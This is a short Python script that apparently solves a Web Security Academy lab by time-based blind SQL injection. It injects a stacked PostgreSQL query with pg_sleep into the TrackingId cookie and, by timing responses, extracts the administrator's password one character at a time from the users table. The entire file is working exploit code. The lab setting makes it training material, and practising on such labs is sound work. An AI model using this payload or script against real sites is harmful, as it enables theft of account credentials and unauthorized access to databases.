
#!/usr/share/python3
import socket
import sys
import requests

password = ''
numbers = [n for n in range(1,21)]
characteres = 'abcdefghijklmnopqrstuvwxyz0123456789'
counter = 1
for n in numbers:
	for y in characteres:
		headers = {"Cookie": f"TrackingId=Jw8VsLOgbuusITHJ'%3BSELECT+CASE+WHEN+(username='administrator' AND SUBSTRING(password,{n},1)='{y}')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--; session=jzhruK8MklJhiyAUKJeXAFgzF9DdlXu3"}
		response = requests.get("https://0aeb002504f8e99bc0781da8001200ce.web-security-academy.net/filter?category=Gifts",headers=headers)
		print(n,y,response)
		if response.elapsed.total_seconds() > 2:
			password += y
			counter += 1
			break
print(password)
